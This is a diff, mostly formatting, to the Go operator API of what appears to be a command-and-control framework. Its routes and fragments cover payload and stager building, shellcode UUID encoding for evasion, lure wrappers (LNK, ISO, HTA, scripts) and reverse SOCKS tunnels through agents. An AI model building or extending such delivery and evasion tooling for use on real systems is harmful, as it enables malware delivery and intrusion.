@@ -13,9 +13,9 @@ import (
 	"io"
 	"log"
 	"net"
-	"os/exec"
 	"net/http"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strconv"
 	"strings"
@@ -41,55 +41,58 @@ func securityHeaders(next http.Handler) http.Handler {
 func (s *Server) operatorMux() *http.ServeMux {
 	mux := http.NewServeMux()
 	// viewer+ (read-only)
-	mux.HandleFunc("/api/agents",    s.requireRole(RoleViewer, s.apiAgents))
-	mux.HandleFunc("/api/agents/",   s.requireAgentDetailRole)
-	mux.HandleFunc("/api/jobs",      s.requireJobsRole)
-	mux.HandleFunc("/api/jobs/",     s.requireRole(RoleOperator, s.apiJobAction))
-	mux.HandleFunc("/api/chat",      s.requireRole(RoleViewer, s.apiChat))
+	mux.HandleFunc("/api/agents", s.requireRole(RoleViewer, s.apiAgents))
+	mux.HandleFunc("/api/agents/", s.requireAgentDetailRole)
+	mux.HandleFunc("/api/jobs", s.requireJobsRole)
+	mux.HandleFunc("/api/jobs/", s.requireRole(RoleOperator, s.apiJobAction))
+	mux.HandleFunc("/api/chat", s.requireRole(RoleViewer, s.apiChat))
 	mux.HandleFunc("/api/operators", s.requireRole(RoleViewer, s.apiOperators))
-	mux.HandleFunc("/api/report",        s.requireRole(RoleViewer, s.apiReport))
-	mux.HandleFunc("/api/attack-layer",  s.requireRole(RoleViewer, s.apiAttackLayer))
-	mux.HandleFunc("/api/pubip",         s.requireRole(RoleViewer, s.apiPubIP))
-	mux.HandleFunc("/api/creds",     s.requireCredsRole)
-	mux.HandleFunc("/api/creds/",    s.requireRole(RoleOperator, s.apiCredAction))
+	mux.HandleFunc("/api/report", s.requireRole(RoleViewer, s.apiReport))
+	mux.HandleFunc("/api/attack-layer", s.requireRole(RoleViewer, s.apiAttackLayer))
+	mux.HandleFunc("/api/pubip", s.requireRole(RoleViewer, s.apiPubIP))
+	mux.HandleFunc("/api/creds", s.requireCredsRole)
+	mux.HandleFunc("/api/creds/", s.requireRole(RoleOperator, s.apiCredAction))
 	// operator+ (can task + build)
-	mux.HandleFunc("/api/build",         s.requireRole(RoleOperator, s.apiBuild))
-	mux.HandleFunc("/api/build/stager",  s.requireRole(RoleOperator, s.apiBuildStager))
+	mux.HandleFunc("/api/build", s.requireRole(RoleOperator, s.apiBuild))
+	mux.HandleFunc("/api/build/stager", s.requireRole(RoleOperator, s.apiBuildStager))
 	mux.HandleFunc("/api/deliver", s.requireRole(RoleOperator, s.apiDeliver))
-	mux.HandleFunc("/api/donut",   s.requireRole(RoleOperator, s.apiDonut))
-	mux.HandleFunc("/api/srdi",    s.requireRole(RoleOperator, s.apiSRDI))
-	mux.HandleFunc("/api/encode",  s.requireRole(RoleOperator, s.apiEncode))
+	mux.HandleFunc("/api/donut", s.requireRole(RoleOperator, s.apiDonut))
+	mux.HandleFunc("/api/srdi", s.requireRole(RoleOperator, s.apiSRDI))
+	mux.HandleFunc("/api/encode", s.requireRole(RoleOperator, s.apiEncode))
 	mux.HandleFunc("/api/gencert", s.requireRole(RoleOperator, s.apiGenCert))
-	mux.HandleFunc("/api/rsocks",  s.requireRole(RoleOperator, s.apiRSocks))
+	mux.HandleFunc("/api/rsocks", s.requireRole(RoleOperator, s.apiRSocks))
 	// SSE event stream + uploads
-	mux.HandleFunc("/api/events",    s.requireRole(RoleViewer, s.apiSSE))
-	mux.HandleFunc("/api/uploads",   s.requireUploadsRole)
-	mux.HandleFunc("/api/dl/",       s.requireDownloadRole)
-	mux.HandleFunc("/api/artifacts",  s.requireRole(RoleViewer, s.apiArtifactList))
+	mux.HandleFunc("/api/events", s.requireRole(RoleViewer, s.apiSSE))
+	mux.HandleFunc("/api/uploads", s.requireUploadsRole)
+	mux.HandleFunc("/api/dl/", s.requireDownloadRole)
+	mux.HandleFunc("/api/artifacts", s.requireRole(RoleViewer, s.apiArtifactList))
 	mux.HandleFunc("/api/artifacts/", s.requireRole(RoleOperator, s.apiArtifact))
 	// Staging file server + tunnel management
-	mux.HandleFunc("/api/stager",          s.requireRole(RoleOperator, s.apiStager))
-	mux.HandleFunc("/api/stager/",         s.requireRole(RoleOperator, s.apiStager))
+	mux.HandleFunc("/api/stager", s.requireRole(RoleOperator, s.apiStager))
+	mux.HandleFunc("/api/stager/", s.requireRole(RoleOperator, s.apiStager))
 	mux.HandleFunc("/api/netinfo", s.requireRole(RoleViewer, s.apiNetInfo))
 	// malleable profiles
-	mux.HandleFunc("/api/profiles",  s.requireRole(RoleOperator, s.apiProfiles))
+	mux.HandleFunc("/api/profiles", s.requireRole(RoleOperator, s.apiProfiles))
 	mux.HandleFunc("/api/profiles/", s.requireRole(RoleOperator, s.apiProfiles))
 	// reactions + webhooks + targets
-	mux.HandleFunc("/api/reactions",  s.requireRole(RoleOperator, s.apiReactions))
+	mux.HandleFunc("/api/reactions", s.requireRole(RoleOperator, s.apiReactions))
 	mux.HandleFunc("/api/reactions/", s.requireRole(RoleOperator, s.apiReactionAction))
-	mux.HandleFunc("/api/webhooks",          s.requireRole(RoleOperator, s.apiWebhooks))
-	mux.HandleFunc("/api/webhooks/test",     s.requireRole(RoleOperator, s.apiTestWebhook))
-	mux.HandleFunc("/api/webhooks/",         s.requireRole(RoleOperator, s.apiWebhookAction))
-	mux.HandleFunc("/api/telegram/updates",  s.requireRole(RoleOperator, s.apiTelegramUpdates))
-	mux.HandleFunc("/api/targets",   s.requireTargetsRole)
-	mux.HandleFunc("/api/targets/",  s.requireRole(RoleOperator, s.apiTargetAction))
+	mux.HandleFunc("/api/webhooks", s.requireRole(RoleOperator, s.apiWebhooks))
+	mux.HandleFunc("/api/webhooks/test", s.requireRole(RoleOperator, s.apiTestWebhook))
+	mux.HandleFunc("/api/webhooks/", s.requireRole(RoleOperator, s.apiWebhookAction))
+	mux.HandleFunc("/api/telegram/updates", s.requireRole(RoleOperator, s.apiTelegramUpdates))
+	mux.HandleFunc("/api/targets", s.requireTargetsRole)
+	mux.HandleFunc("/api/targets/", s.requireRole(RoleOperator, s.apiTargetAction))
 	// bloodhound
-	mux.HandleFunc("/api/bloodhound",          s.requireRole(RoleOperator, s.apiBloodHound))
-	mux.HandleFunc("/api/bloodhound/",         s.requireBloodHoundRole)
-	mux.HandleFunc("/api/mesh",  s.requireRole(RoleViewer,   s.apiMesh))
+	mux.HandleFunc("/api/bloodhound", s.requireRole(RoleOperator, s.apiBloodHound))
+	mux.HandleFunc("/api/bloodhound/", s.requireBloodHoundRole)
+	// community modules: discovery is viewer-readable, execution/reload is operator-only.
+	mux.HandleFunc("/api/plugins", s.requirePluginRole)
+	mux.HandleFunc("/api/plugins/", s.requirePluginRole)
+	mux.HandleFunc("/api/mesh", s.requireRole(RoleViewer, s.apiMesh))
 	mux.HandleFunc("/api/mesh/", s.requireRole(RoleOperator, s.apiMesh))
 	// operator+ data management; destructive reset remains admin-only.
-	mux.HandleFunc("/api/roles",   s.requireRole(RoleAdmin, s.apiRoles))
+	mux.HandleFunc("/api/roles", s.requireRole(RoleAdmin, s.apiRoles))
 	mux.HandleFunc("/api/admin/data", s.requireRole(RoleOperator, s.apiAdminData))
 	mux.HandleFunc("/api/admin/data/", s.requireRole(RoleOperator, s.apiAdminData))
 	mux.HandleFunc("/api/admin/data/reset", s.requireRole(RoleAdmin, s.apiAdminData))
@@ -97,7 +100,7 @@ func (s *Server) operatorMux() *http.ServeMux {
 	mux.HandleFunc("/api/admin/data/snapshot/preview", s.requireRole(RoleOperator, s.apiAdminData))
 	mux.HandleFunc("/api/admin/data/snapshot/import", s.requireRole(RoleOperator, s.apiAdminData))
 	mux.HandleFunc("/api/canaries", s.requireRole(RoleViewer, s.apiCanaries))
-	mux.HandleFunc("/bofs",  s.requireRole(RoleOperator, s.apiBOFs))
+	mux.HandleFunc("/bofs", s.requireRole(RoleOperator, s.apiBOFs))
 	mux.HandleFunc("/bofs/", s.requireRole(RoleOperator, s.apiBOFs))
 
 	mux.HandleFunc("/api/ping", func(w http.ResponseWriter, r *http.Request) {
@@ -534,7 +537,8 @@ func (s *Server) apiAgentDetail(w http.ResponseWriter, r *http.Request) {
 
 // apiEncode provides shellcode encoding utilities.
 // POST /api/encode?type=uuid&file=<filename>
-//   Returns UuidFromStringA-compatible C code and a UUID list for the shellcode.
+//
+//	Returns UuidFromStringA-compatible C code and a UUID list for the shellcode.
 func (s *Server) apiEncode(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		jsonErr(w, "POST required", http.StatusMethodNotAllowed)
@@ -580,7 +584,9 @@ func (s *Server) apiEncode(w http.ResponseWriter, r *http.Request) {
 // UuidFromStringA() (Rpcrt4.dll).  Returns a C code snippet + raw UUID list.
 //
 // Encoding layout (matches UuidFromStringA byte order):
-//   UUID = {d1(4 LE), d2(2 LE), d3(2 LE), d4[0], d4[1], d4[2..7]}
+//
+//	UUID = {d1(4 LE), d2(2 LE), d3(2 LE), d4[0], d4[1], d4[2..7]}
+//
 // So sc[0..3] → d1 (printed big-endian), sc[4..5] → d2, sc[6..7] → d3,
 // sc[8..9] → d4[0..1], sc[10..15] → d4[2..7].
 func encodeUUIDs(sc []byte) (code string, uuids []string) {
@@ -1805,11 +1811,11 @@ func (s *Server) apiRoles(w http.ResponseWriter, r *http.Request) {
 
 // apiRSocks manages reverse SOCKS5 tunnels through agents.
 //
-//   POST   /api/rsocks  {"agent_id":"...", "socks_port":1080, "user":"u", "pass":"p"}
-//     → starts rsocks, queues RSOCKS_START on agent
-//     → returns {"socks_port":1080, "callback_port":N, "status":"started"}
-//   DELETE /api/rsocks  {"agent_id":"..."}
-//     → stops rsocks, queues RSOCKS_STOP on agent
+//	POST   /api/rsocks  {"agent_id":"...", "socks_port":1080, "user":"u", "pass":"p"}
+//	  → starts rsocks, queues RSOCKS_START on agent
+//	  → returns {"socks_port":1080, "callback_port":N, "status":"started"}
+//	DELETE /api/rsocks  {"agent_id":"..."}
+//	  → stops rsocks, queues RSOCKS_STOP on agent
 func (s *Server) apiRSocks(w http.ResponseWriter, r *http.Request) {
 	switch r.Method {
 	case http.MethodPost:
@@ -2004,11 +2010,11 @@ func (s *Server) apiSRDI(w http.ResponseWriter, r *http.Request) {
 // CORS headers are added so the hosted Navigator can fetch it directly via #layerURL=.
 func (s *Server) apiAttackLayer(w http.ResponseWriter, r *http.Request) {
 	type technique struct {
-		TechniqueID        string `json:"techniqueID"`
-		Score              int    `json:"score"`
-		Comment            string `json:"comment"`
-		Enabled            bool   `json:"enabled"`
-		ShowSubtechniques  bool   `json:"showSubtechniques"`
+		TechniqueID       string `json:"techniqueID"`
+		Score             int    `json:"score"`
+		Comment           string `json:"comment"`
+		Enabled           bool   `json:"enabled"`
+		ShowSubtechniques bool   `json:"showSubtechniques"`
 	}
 	type gradient struct {
 		Colors   []string `json:"colors"`
@@ -2025,15 +2031,15 @@ func (s *Server) apiAttackLayer(w http.ResponseWriter, r *http.Request) {
 		Layer     string `json:"layer"`
 	}
 	type layer struct {
-		Name        string       `json:"name"`
-		Versions    versions     `json:"versions"`
-		Domain      string       `json:"domain"`
-		Description string       `json:"description"`
-		Techniques  []technique  `json:"techniques"`
-		Gradient    gradient     `json:"gradient"`
-		LegendItems []legendItem `json:"legendItems"`
-		HideDisabled bool        `json:"hideDisabled"`
-		ShowTacticRowBackground bool `json:"showTacticRowBackground"`
+		Name                    string       `json:"name"`
+		Versions                versions     `json:"versions"`
+		Domain                  string       `json:"domain"`
+		Description             string       `json:"description"`
+		Techniques              []technique  `json:"techniques"`
+		Gradient                gradient     `json:"gradient"`
+		LegendItems             []legendItem `json:"legendItems"`
+		HideDisabled            bool         `json:"hideDisabled"`
+		ShowTacticRowBackground bool         `json:"showTacticRowBackground"`
 	}
 
 	// task-type → ATT&CK technique ID
@@ -2091,7 +2097,9 @@ func (s *Server) apiAttackLayer(w http.ResponseWriter, r *http.Request) {
 
 	maxScore := 1
 	for _, c := range counts {
-		if c > maxScore { maxScore = c }
+		if c > maxScore {
+			maxScore = c
+		}
 	}
 
 	var techs []technique
@@ -2200,12 +2208,12 @@ func (s *Server) apiPubIP(w http.ResponseWriter, r *http.Request) {
 
 // DeliverConfig describes a standalone delivery wrapper request.
 type DeliverConfig struct {
-	Wrapper    string `json:"wrapper"`       // lnk|iso|hta|html|ps1|bat|jscript|vbscript|sct|wsf|zip
-	Artifact   string `json:"artifact"`      // filename from bin/payloads/ (EXE or BIN)
-	StageURL   string `json:"stage_url"`     // base C2 URL for shellcode staging
-	LureName   string `json:"lure_name"`     // lure filename inside the wrapper (no extension)
-	ISOLabel   string `json:"iso_label"`     // volume label for ISO (default: Documents)
-	StageMaxDL int    `json:"stage_max_dl"`  // max downloads per staged file (0 = unlimited)
+	Wrapper    string `json:"wrapper"`      // lnk|iso|hta|html|ps1|bat|jscript|vbscript|sct|wsf|zip
+	Artifact   string `json:"artifact"`     // filename from bin/payloads/ (EXE or BIN)
+	StageURL   string `json:"stage_url"`    // base C2 URL for shellcode staging
+	LureName   string `json:"lure_name"`    // lure filename inside the wrapper (no extension)
+	ISOLabel   string `json:"iso_label"`    // volume label for ISO (default: Documents)
+	StageMaxDL int    `json:"stage_max_dl"` // max downloads per staged file (0 = unlimited)
 }
 
 func (s *Server) apiBuildStager(w http.ResponseWriter, r *http.Request) {
@@ -2360,25 +2368,39 @@ func (s *Server) apiDeliver(w http.ResponseWriter, r *http.Request) {
 	switch cfg.Wrapper {
 	case "ps1":
 		p, e := BuildPS1(ps, lureName, deliveryDir)
-		if !wrap(p, "ps1", e) { return }
+		if !wrap(p, "ps1", e) {
+			return
+		}
 	case "bat":
 		p, e := BuildBAT(ps, lureName, deliveryDir)
-		if !wrap(p, "bat", e) { return }
+		if !wrap(p, "bat", e) {
+			return
+		}
 	case "jscript":
 		p, e := BuildJScript(ps, lureName, deliveryDir)
-		if !wrap(p, "js", e) { return }
+		if !wrap(p, "js", e) {
+			return
+		}
 	case "vbscript":
 		p, e := BuildVBScript(ps, lureName, deliveryDir)
-		if !wrap(p, "vbs", e) { return }
+		if !wrap(p, "vbs", e) {
+			return
+		}
 	case "sct":
 		p, e := BuildSCT(ps, lureName, deliveryDir)
-		if !wrap(p, "sct", e) { return }
+		if !wrap(p, "sct", e) {
+			return
+		}
 	case "wsf":
 		p, e := BuildWSF(ps, lureName, deliveryDir)
-		if !wrap(p, "wsf", e) { return }
+		if !wrap(p, "wsf", e) {
+			return
+		}
 	case "hta":
 		p, e := BuildHTA(ps, deliveryDir, lureName)
-		if !wrap(p, "hta", e) { return }
+		if !wrap(p, "hta", e) {
+			return
+		}
 	case "lnk", "iso", "zip":
 		// Stage PS1 and use a short stub in the LNK (~260 chars).
 		// Windows truncates LNK Arguments at ~4096 chars; the full encoded
@@ -2392,7 +2414,9 @@ func (s *Server) apiDeliver(w http.ResponseWriter, r *http.Request) {
 		switch cfg.Wrapper {
 		case "lnk":
 			p, e := BuildLNK(psArgs, deliveryDir, lureName)
-			if !wrap(p, "lnk", e) { return }
+			if !wrap(p, "lnk", e) {
+				return
+			}
 		case "iso":
 			lnkPath, err := BuildLNK(psArgs, deliveryDir, lureName)
 			if err != nil {
@@ -2400,7 +2424,9 @@ func (s *Server) apiDeliver(w http.ResponseWriter, r *http.Request) {
 				return
 			}
 			isoPath, err := BuildISO(map[string]string{lureName + ".lnk": lnkPath}, isoLabel, deliveryDir)
-			if !wrap(isoPath, "iso", err) { return }
+			if !wrap(isoPath, "iso", err) {
+				return
+			}
 		case "zip":
 			lnkPath, err := BuildLNK(psArgs, deliveryDir, lureName)
 			if err != nil {
@@ -2408,7 +2434,9 @@ func (s *Server) apiDeliver(w http.ResponseWriter, r *http.Request) {
 				return
 			}
 			zipPath, err := BuildZIPLNK(lnkPath, lureName, deliveryDir)
-			if !wrap(zipPath, "zip", err) { return }
+			if !wrap(zipPath, "zip", err) {
+				return
+			}
 		}
 	default:
 		jsonErr(w, "unknown wrapper: "+cfg.Wrapper, http.StatusBadRequest)
@@ -2669,13 +2697,14 @@ func (s *Server) apiReactionAction(w http.ResponseWriter, r *http.Request) {
 // ── BloodHound integration ─────────────────────────────────────────────────────
 
 // apiBloodHound handles all /api/bloodhound/* routes.
-//   POST   /api/bloodhound           — upload SharpHound ZIP or JSON
-//   DELETE /api/bloodhound           — wipe graph
-//   GET    /api/bloodhound/graph     — full graph (nodes + edges)
-//   GET    /api/bloodhound/context   — AI-friendly domain summary
-//   GET    /api/bloodhound/context?hostname=X — host summary
-//   GET    /api/bloodhound/stats     — node/edge counts
-//   GET    /api/bloodhound/uploads   — upload history
+//
+//	POST   /api/bloodhound           — upload SharpHound ZIP or JSON
+//	DELETE /api/bloodhound           — wipe graph
+//	GET    /api/bloodhound/graph     — full graph (nodes + edges)
+//	GET    /api/bloodhound/context   — AI-friendly domain summary
+//	GET    /api/bloodhound/context?hostname=X — host summary
+//	GET    /api/bloodhound/stats     — node/edge counts
+//	GET    /api/bloodhound/uploads   — upload history
 func (s *Server) apiBloodHound(w http.ResponseWriter, r *http.Request) {
 	sub := strings.TrimPrefix(r.URL.Path, "/api/bloodhound")
 	sub = strings.TrimPrefix(sub, "/")
@@ -2882,7 +2911,6 @@ func (s *Server) apiMesh(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-
 func (s *Server) apiCanaries(w http.ResponseWriter, r *http.Request) {
 	rows, err := s.db.ListCanaries()
 	if err != nil {
@@ -2993,7 +3021,7 @@ func (s *Server) apiBOFInstall(w http.ResponseWriter, bofDir string) {
 		url  string
 	}{
 		{"CS-Situational-Awareness-BOF", "https://github.com/trustedsec/CS-Situational-Awareness-BOF.git"},
-		{"CS-Remote-Ops-BOF",             "https://github.com/trustedsec/CS-Remote-Ops-BOF.git"},
+		{"CS-Remote-Ops-BOF", "https://github.com/trustedsec/CS-Remote-Ops-BOF.git"},
 	}
 
 	var lines []string
